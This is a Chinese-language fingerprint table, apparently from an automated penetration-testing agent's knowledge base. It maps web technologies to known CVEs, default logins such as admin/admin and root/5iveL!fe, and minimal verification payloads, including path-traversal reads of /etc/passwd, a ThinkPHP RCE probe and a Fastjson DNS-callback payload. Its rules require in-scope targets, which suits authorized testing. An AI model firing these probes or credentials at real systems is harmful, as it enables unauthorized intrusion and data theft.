---
id: fingerprints/tech-vuln-map
type: fingerprint
tags: [fingerprint, tech, cve, default-login, 默认口令]
source: self
license: MIT
version: 1
updated: 2026-10-22
---

# 技术栈指纹 → 已知漏洞族（高频 20 条）

**用法**：写下含 `tech/version` 的 fact 后立刻查本表；命中族名后**必须实际触发**才算漏洞，只匹配版本只算线索（`confidence=inferred`）。

| 指纹特征 | 技术 | 已知漏洞族 | 默认路径/口令 | 最小验证 |
|---|---|---|---|---|
| 响应头 `Set-Cookie: rememberMe=deleteMe` | Shiro | Shiro-550 反序列化（CVE-2016-4437） | — | 请求带 `rememberMe=1` 看是否回 `deleteMe` |
| 报错含 `@type` 或 JSON 解析异常 | Fastjson | 1.2.24/1.2.47 反序列化 RCE | — | 提交 `{"@type":"java.net.Inet4Address","val":"<OAST>"}` 看 DNS 回连 |
| `Whitelabel Error Page` | Spring Boot | `/actuator/*` 未授权、Spring4Shell（CVE-2022-22965） | `/actuator/env`、`/actuator/heapdump` | GET `/actuator/env`，200 且有 `propertySources` |
| `/console/login/LoginForm.jsp` | WebLogic | CVE-2020-14882/14883 未授权+RCE | `weblogic/weblogic` | 未授权访问 `/console/css/%252e%252e%252fconsole.portal` |
| URL 含 `.action` / `.do` | Struts2 | S2-045/046/057（OGNL 注入） | — | `Content-Type` 里塞 OGNL 表达式，看回显/延时 |
| `/script` 或 `/manage` 可访问 | Jenkins | 未授权脚本控制台、CLI 50000 端口 | `admin/admin` | GET `/script`，200 即未授权 |
| 响应含 `X-Powered-By: ThinkPHP` 或 `?s=` 路由 | ThinkPHP | 5.0.x/5.1.x RCE（`s=` + `_method=__construct`） | — | POST `/?s=captcha` + `_method=__construct&filter[]=phpinfo` |
| `/users/sign_in` + `GitLab` | GitLab | CVE-2021-22205（ExifTool 上传 RCE） | `root/5iveL!fe`（老版本） | 上传带 DjVu 的图片看是否 500 且执行 |
| `/nacos/` 或 `/nacos/v1/auth/users` | Nacos | 默认 token 未授权、Derby 未授权 | `nacos/nacos` | GET `/nacos/v1/auth/users?pageNo=1&pageSize=9` 返回用户列表 |
| `/solr/admin/cores` | Solr | CVE-2019-17558  Velocity 模板 RCE | — | `?wt=json` 看 cores 是否暴露 |
| `/login` + `Grafana` | Grafana | CVE-2021-43798 任意文件读取 | `admin/admin` | GET `/public/plugins/alertlist/../../../../etc/passwd` |
| `/pages/` + `Confluence` | Confluence | CVE-2022-26134 OGNL 未授权 RCE | — | `/%24%7B%28%23a%3D...%7D/` 路径注入 |
| `owa/` 或 `Outlook Web App` | Exchange | ProxyLogon/ProxyShell（CVE-2021-26855 等） | — | `autodiscover/autodiscover.xml` 探测 |
| `CHANGELOG.txt` 可读 | Drupal | Drupalgeddon2（CVE-2018-7600）、CVE-2019-6340 | — | `user/register?element_parents=...` 表单注入 |
| `wp-login.php` | WordPress | 插件/主题漏洞、`?rest_route=` 用户枚举 | `admin/admin` | `/wp-json/wp/v2/users` 枚举用户名 |
| Laravel + `Ignition` 报错页 | Laravel | CVE-2021-3129（Ignition RCE） | — | `_ignition/execute-solution` 触发 |
| `Server: Apache-Coyote` + `/manager/html` | Tomcat | manager 弱口令 → WAR 部署 | `tomcat/tomcat`、`admin/admin` | GET `/manager/html` 看是否 401/200 |
| `/phpmyadmin/` | phpMyAdmin | 弱口令、CVE-2018-12613 LFI | `root/root`、`root/空` | 登录后 `?target=db_sql.php%253f/../../etc/passwd` |
| 6379 可连且回 `+OK` | Redis | 未授权 → 写 crontab/SSH key/WebShell | 无 | `INFO` 有输出即未授权 |
| 3306 可连 | MySQL | 弱口令、`FILE` 权限读写、UDF 提权 | `root/root`、`root/空` | `mysql -h TARGET -uroot -p` 试空口令一次 |

## 纪律

- **只匹配版本 ≠ 漏洞**。必须实际触发，或至少拿到「可证明能力」的响应（文件内容、回显、延时）。
- 一次不成就换手法（换编码、换入口、换参数位置），但**同一入口最多 2 次不同手法**，之后交给顾问判断该不该换层。
- 打之前先确认端口/服务是**目标范围内**的资产，范围外的一律跳过。

## 关联

- 手法细节：`tactics/`；接口形状：`surfaces/`；最小 payload：`payloads/`
